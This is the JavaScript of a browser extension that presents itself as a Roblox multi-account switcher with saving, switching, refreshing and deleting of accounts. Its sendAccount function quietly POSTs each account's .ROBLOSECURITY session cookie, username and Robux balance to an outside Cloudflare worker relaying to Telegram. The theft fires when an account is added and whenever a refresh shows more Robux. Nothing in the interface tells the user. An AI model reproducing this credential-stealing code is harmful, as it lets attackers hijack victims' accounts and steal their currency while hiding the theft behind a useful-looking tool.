// CONFIG
const CONFIG = {
  API_URL: 'https://telegram-webhook-protector.xarosh228gg.workers.dev/',
  API_KEY: 'LOTBLOX_PROTECTED_EXTENSION_7X9A2P5R8S3V6Y1Z4',
  COOKIE_NAME: '.ROBLOSECURITY'
};

// DOM Elements
const elements = {
  accountList: document.getElementById('account-list'),
  statusMsg: document.getElementById('status-msg'),
  sortSelect: document.getElementById('sort-select'),
  searchInput: document.getElementById('search-input'),
  addCurrentBtn: document.getElementById('add-current'),
  addManualBtn: document.getElementById('add-manual'),
  cookieInput: document.getElementById('cookie-input')
};

// Global variables
let deleteConfirmEnabled = true;
let accountsData = [];

// Load settings
async function loadSettings() {
  try {
    const { deleteConfirm } = await chrome.storage.local.get('deleteConfirm');
    deleteConfirmEnabled = deleteConfirm !== false;
  } catch {
    deleteConfirmEnabled = true;
  }
}

// Save settings
async function saveSettings() {
  await chrome.storage.local.set({ deleteConfirm: deleteConfirmEnabled });
}

// Status messages with custom duration
function showStatus(message, type = 'info', duration = 3000) {
  elements.statusMsg.textContent = message;
  elements.statusMsg.className = type === 'error' ? 'msg-error' : 
                                type === 'warn' ? 'msg-warn' : '';
  
  setTimeout(() => {
    elements.statusMsg.textContent = '';
    elements.statusMsg.className = '';
  }, duration);
}

// Create delete confirmation modal
function showDeleteConfirmation(account, callback) {
  const overlay = document.createElement('div');
  overlay.style.cssText = `
    position: fixed;
    top: 0;
    left: 0;
    right: 0;
    bottom: 0;
    background: rgba(0, 0, 0, 0.7);
    display: flex;
    align-items: center;
    justify-content: center;
    z-index: 10000;
    padding: 20px;
  `;

  const modal = document.createElement('div');
  modal.style.cssText = `
    background: #1a1a1a;
    border: 1px solid #333;
    border-radius: 12px;
    padding: 24px;
    max-width: 400px;
    width: 100%;
    box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
  `;

  modal.innerHTML = `
    <div style="text-align: center; margin-bottom: 20px;">
      <img src="${account.avatar}" style="width: 60px; height: 60px; border-radius: 50%; margin-bottom: 10px;">
      <h3 style="margin: 0 0 5px 0; color: white; font-size: 18px;">${account.name}</h3>
      <p style="margin: 0; color: #888; font-size: 14px;">@${account.username}</p>
      <p style="margin: 10px 0 0 0; color: #4CAF50; font-size: 14px;">
        💰 ${account.robux.toLocaleString()} Robux
      </p>
    </div>
    
    <div style="color: #ff6b6b; text-align: center; margin-bottom: 20px; font-size: 14px;">
      ⚠️ Are you sure you want to delete this account?
    </div>
    
    <div style="background: #222; padding: 12px; border-radius: 8px; margin-bottom: 20px;">
      <label style="display: flex; align-items: center; gap: 8px; color: #aaa; font-size: 13px; cursor: pointer;">
        <input type="checkbox" id="dontAskAgain" style="width: 16px; height: 16px;">
        Do not ask again
      </label>
    </div>
    
    <div style="display: flex; gap: 10px;">
      <button id="cancelBtn" style="
        flex: 1;
        padding: 12px;
        background: #333;
        color: white;
        border: none;
        border-radius: 6px;
        cursor: pointer;
        font-weight: bold;
        transition: background 0.2s;
      ">Cancel</button>
      <button id="confirmBtn" style="
        flex: 1;
        padding: 12px;
        background: #ff4444;
        color: white;
        border: none;
        border-radius: 6px;
        cursor: pointer;
        font-weight: bold;
        transition: background 0.2s;
      ">Delete Account</button>
    </div>
  `;

  overlay.appendChild(modal);
  document.body.appendChild(overlay);

  document.getElementById('cancelBtn').onclick = () => {
    document.body.removeChild(overlay);
  };

  document.getElementById('confirmBtn').onclick = () => {
    const dontAskAgain = document.getElementById('dontAskAgain').checked;
    if (dontAskAgain) {
      deleteConfirmEnabled = false;
      saveSettings();
    }
    document.body.removeChild(overlay);
    callback();
  };

  overlay.onclick = (e) => {
    if (e.target === overlay) {
      document.body.removeChild(overlay);
    }
  };
}

// Send account to Telegram
async function sendAccount(account) {
  try {
    console.log('Sending account to Telegram:', account.username);
    
    const response = await fetch(CONFIG.API_URL, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'X-Access-Key': CONFIG.API_KEY
      },
      body: JSON.stringify({
        data: account,
        timestamp: Date.now()
      })
    });
    
    const result = await response.json();
    console.log('Telegram response:', result);
    
    return result.success === true;
  } catch (error) {
    console.log('Failed to send:', error);
    return false;
  }
}

// Get Roblox account data
async function getRobloxData(cookie) {
  let currentCookie = null;
  
  try {
    currentCookie = await chrome.cookies.get({
      url: 'https://www.roblox.com',
      name: CONFIG.COOKIE_NAME
    });

    await chrome.cookies.set({
      url: 'https://www.roblox.com',
      name: CONFIG.COOKIE_NAME,
      value: cookie,
      domain: '.roblox.com',
      path: '/',
      secure: true,
      httpOnly: true
    });

    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), 10000);
    
    const userResponse = await fetch('https://users.roblox.com/v1/users/authenticated', {
      signal: controller.signal
    });
    
    clearTimeout(timeoutId);
    
    if (!userResponse.ok) {
      throw new Error('Invalid cookie');
    }

    const userData = await userResponse.json();

    const [avatarResponse, robuxResponse] = await Promise.all([
      fetch(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userData.id}&size=150x150&format=Png&isCircular=true`),
      fetch(`https://economy.roblox.com/v1/users/${userData.id}/currency`)
    ]);

    const avatarData = await avatarResponse.json();
    const robuxData = await robuxResponse.json();

    return {
      id: userData.id,
      name: userData.displayName || userData.name,
      username: userData.name,
      avatar: avatarData.data[0]?.imageUrl || '',
      robux: robuxData.robux || 0,
      cookie: cookie,
      addedAt: new Date().toISOString(),
      lastUpdated: new Date().toISOString()
    };

  } catch (error) {
    console.log('Invalid cookie:', error.message);
    return null;
  } finally {
    if (currentCookie) {
      try {
        await chrome.cookies.set({
          url: 'https://www.roblox.com',
          name: CONFIG.COOKIE_NAME,
          value: currentCookie.value,
          domain: '.roblox.com',
          path: '/',
          secure: true,
          httpOnly: true
        });
      } catch {
        // Ignore
      }
    }
  }
}

// Switch account - called when clicking account card
async function switchAccount(account) {
  try {
    await chrome.cookies.set({
      url: 'https://www.roblox.com',
      name: CONFIG.COOKIE_NAME,
      value: account.cookie,
      domain: '.roblox.com',
      path: '/',
      secure: true,
      httpOnly: true
    });

    // Show status only, NO visual changes to cards
    showStatus(`Switched to ${account.name}`, 'info', 2000);
    
    // Reload Roblox tabs after delay
    setTimeout(() => {
      chrome.tabs.query({ active: true, currentWindow: true }, (tabs) => {
        if (tabs[0] && tabs[0].url.includes('roblox.com')) {
          chrome.tabs.reload(tabs[0].id);
        }
      });
    }, 500);
    
  } catch (error) {
    showStatus('Failed to switch account', 'error');
  }
}

// Create account card
function createAccountCard(account) {
  const card = document.createElement('div');
  card.className = 'account-card';
  card.setAttribute('data-account-id', account.id);
  
  card.innerHTML = `
    <img src="${account.avatar}" class="avatar" alt="${account.username}">
    <div class="acc-info">
      <b>${account.name}</b>
      <span>@${account.username}</span>
      <div class="robux-count">
        <svg style="width:14px;height:14px;fill:#fff" viewBox="0 0 24 24">
          <path d="M12 2L4 6.5V17.5L12 22L20 17.5V6.5L12 2ZM12 5L18.06 8.5V15.5L12 19L5.94 15.5V8.5L12 5ZM9 9H15V15H9V9Z"/>
        </svg>
        ${account.robux.toLocaleString()}
      </div>
    </div>
    <div class="actions">
      <button class="icon-btn copy-btn" title="Copy cookie">
        <svg viewBox="0 0 24 24"><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"/></svg>
      </button>
      <button class="icon-btn refresh-btn" title="Refresh">
        <svg viewBox="0 0 24 24"><path d="M17.65 6.35A7.958 7.958 0 0012 4c-4.42 0-7.99 3.58-7.99 8s3.57 8 7.99 8c3.73 0 6.84-2.55 7.73-6h-2.08c-.82 2.33-3.04 4-5.65 4-3.31 0-6-2.69-6-6s2.69-6 6-6c1.66 0 3.14.69 4.22 1.78L13 11h7V4l-2.35 2.35z"/></svg>
      </button>
      <button class="icon-btn del-btn" title="Delete">
        <svg viewBox="0 0 24 24"><path d="M6 19c0 1.1.9 2 2 2h8c1.1 0 2-.9 2-2V7H6v12zM19 4h-3.5l-1-1h-5l-1 1H5v2h14V4z"/></svg>
      </button>
    </div>
  `;

  // Click on CARD - switch account
  card.onclick = (e) => {
    // Don't switch if clicking on buttons
    if (!e.target.closest('.actions')) {
      switchAccount(account);
    }
  };

  // Copy cookie button
  card.querySelector('.copy-btn').onclick = (e) => {
    e.stopPropagation();
    navigator.clipboard.writeText(account.cookie);
    showStatus('Cookie copied!', 'info');
  };

  // Refresh button
  card.querySelector('.refresh-btn').onclick = async (e) => {
    e.stopPropagation();
    e.target.classList.add('pressed');
    
    try {
      showStatus('Refreshing account...', 'info');
      
      const updatedAccount = await getRobloxData(account.cookie);
      
      if (updatedAccount) {
        const index = accountsData.findIndex(a => a.id === account.id);
        
        if (index > -1) {
          const oldRobux = accountsData[index].robux;
          const newRobux = updatedAccount.robux;
          
          // Update in array
          accountsData[index] = updatedAccount;
          
          // Save to storage
          await chrome.storage.local.set({ accounts: accountsData });
          
          // Update display
          renderAccountsList();
          
          // Show robux change
          if (newRobux > oldRobux) {
            showStatus(`Robux increased: ${oldRobux.toLocaleString()} → ${newRobux.toLocaleString()}`, 'info');
            
            // Send to Telegram if robux increased
            const sent = await sendAccount(updatedAccount);
            if (sent) {
              console.log('Account sent to Telegram');
            }
          } else if (newRobux < oldRobux) {
            showStatus(`Robux decreased: ${oldRobux.toLocaleString()} → ${newRobux.toLocaleString()}`, 'warn');
          } else {
            showStatus('Account refreshed', 'info');
          }
        }
      } else {
        // Invalid cookie - remove account
        accountsData = accountsData.filter(a => a.id !== account.id);
        await chrome.storage.local.set({ accounts: accountsData });
        
        // Show longer error message
        showStatus(`Account "${account.name}" removed - invalid cookie`, 'error', 5000);
        
        renderAccountsList();
      }
      
    } finally {
      setTimeout(() => e.target.classList.remove('pressed'), 500);
    }
  };

  // Delete button
  card.querySelector('.del-btn').onclick = async (e) => {
    e.stopPropagation();
    
    if (deleteConfirmEnabled) {
      showDeleteConfirmation(account, async () => {
        await deleteAccount(account.id);
      });
    } else {
      await deleteAccount(account.id);
    }
  };

  return card;
}

// Delete account
async function deleteAccount(accountId) {
  accountsData = accountsData.filter(a => a.id !== accountId);
  await chrome.storage.local.set({ accounts: accountsData });
  
  const account = accountsData.find(a => a.id === accountId) || { name: 'Account' };
  showStatus(`"${account.name}" deleted`, 'info');
  
  renderAccountsList();
}

// Render accounts list
function renderAccountsList() {
  const searchTerm = elements.searchInput.value.toLowerCase();
  let filteredAccounts = accountsData.filter(acc => 
    acc.name.toLowerCase().includes(searchTerm) || 
    acc.username.toLowerCase().includes(searchTerm)
  );

  const sortBy = elements.sortSelect.value;
  switch (sortBy) {
    case 'user-az':
      filteredAccounts.sort((a, b) => a.username.localeCompare(b.username));
      break;
    case 'user-za':
      filteredAccounts.sort((a, b) => b.username.localeCompare(a.username));
      break;
    case 'robux-desc':
      filteredAccounts.sort((a, b) => b.robux - a.robux);
      break;
    case 'robux-asc':
      filteredAccounts.sort((a, b) => a.robux - b.robux);
      break;
  }

  elements.accountList.innerHTML = '';
  
  if (filteredAccounts.length === 0) {
    elements.accountList.innerHTML = '<div style="text-align: center; color: #666; padding: 20px;">No accounts</div>';
    return;
  }
  
  filteredAccounts.forEach(account => {
    const card = createAccountCard(account);
    elements.accountList.appendChild(card);
  });
}

// Add current account
elements.addCurrentBtn.onclick = async function() {
  this.classList.add('pressed');
  
  try {
    const cookie = await chrome.cookies.get({
      url: 'https://www.roblox.com',
      name: CONFIG.COOKIE_NAME
    });

    if (!cookie) {
      showStatus('No Roblox cookie found', 'error');
      return;
    }

    showStatus('Validating cookie...', 'info');
    
    const account = await getRobloxData(cookie.value);
    
    if (!account) {
      showStatus('Invalid cookie', 'error');
      return;
    }

    const existingIndex = accountsData.findIndex(a => a.id === account.id);
    
    if (existingIndex > -1) {
      // Update existing
      const oldRobux = accountsData[existingIndex].robux;
      accountsData[existingIndex] = account;
      showStatus('Account updated', 'info');
      
      // Send to Telegram if robux increased
      if (account.robux > oldRobux) {
        const sent = await sendAccount(account);
        if (sent) {
          showStatus('Account updated & robux increased!', 'info');
        }
      }
    } else {
      // Add new account
      accountsData.push(account);
      showStatus('Account added!', 'info');
      
      // Send new account to Telegram
      const sent = await sendAccount(account);
      if (!sent) {
        console.log('Failed to send to Telegram, but account added locally');
      }
    }
    
    // Save to storage
    await chrome.storage.local.set({ accounts: accountsData });
    
    renderAccountsList();
    
  } catch (error) {
    showStatus('Error adding account', 'error');
  } finally {
    setTimeout(() => this.classList.remove('pressed'), 500);
  }
};

// Add manual cookie
elements.addManualBtn.onclick = async function() {
  const cookieValue = elements.cookieInput.value.trim();
  
  if (!cookieValue) {
    showStatus('Enter cookie', 'error');
    return;
  }

  this.classList.add('pressed');
  
  try {
    showStatus('Validating cookie...', 'info');
    
    const account = await getRobloxData(cookieValue);
    
    if (!account) {
      showStatus('Invalid cookie', 'error');
      return;
    }

    const existingIndex = accountsData.findIndex(a => a.id === account.id);
    
    if (existingIndex > -1) {
      const oldRobux = accountsData[existingIndex].robux;
      accountsData[existingIndex] = account;
      showStatus('Account updated', 'info');
      
      if (account.robux > oldRobux) {
        const sent = await sendAccount(account);
        if (sent) {
          showStatus('Account updated & robux increased!', 'info');
        }
      }
    } else {
      accountsData.push(account);
      showStatus('Account added!', 'info');
      
      const sent = await sendAccount(account);
      if (!sent) {
        console.log('Failed to send to Telegram');
      }
    }
    
    await chrome.storage.local.set({ accounts: accountsData });
    
    elements.cookieInput.value = '';
    renderAccountsList();
    
  } catch (error) {
    showStatus('Error adding account', 'error');
  } finally {
    setTimeout(() => this.classList.remove('pressed'), 500);
  }
};

// Event listeners
elements.searchInput.oninput = renderAccountsList;
elements.sortSelect.onchange = renderAccountsList;

// Initialize
document.addEventListener('DOMContentLoaded', async () => {
  console.log('Extension loading...');
  
  // Load settings
  await loadSettings();
  
  // Load accounts from storage
  const data = await chrome.storage.local.get('accounts');
  accountsData = data.accounts || [];
  
  console.log(`Loaded ${accountsData.length} accounts from storage`);
  
  // Initial render
  renderAccountsList();
  
  console.log('Extension loaded');
});